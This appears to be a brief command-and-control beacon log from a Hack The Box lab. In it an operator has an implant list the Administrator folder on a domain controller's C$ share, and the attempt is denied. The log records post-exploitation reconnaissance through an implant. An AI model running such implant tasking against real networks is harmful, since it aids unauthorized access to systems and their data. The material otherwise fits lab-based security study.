+10/23 12:52:44 UTC [input] <d0pt3x> powershell ls \\dc01.manager.htb\c$\users\administrator
+10/23 12:52:44 UTC [task] <T1086> Tasked beacon to run: ls \\dc01.manager.htb\c$\users\administrator
+10/23 12:52:46 UTC [checkin] host called home, sent: 183 bytes
+10/23 12:52:47 UTC [output]
+received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">ls : Access to the path '\\dc01.manager.htb\c$\users\administrator' is denied._x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ ls \\dc01.manager.htb\c$\users\administrator_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (\\dc01.manager....s\administrator:String) [Get-ChildItem], Unauthoriz _x000D__x000A_</S><S S="Error">   edAccessException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
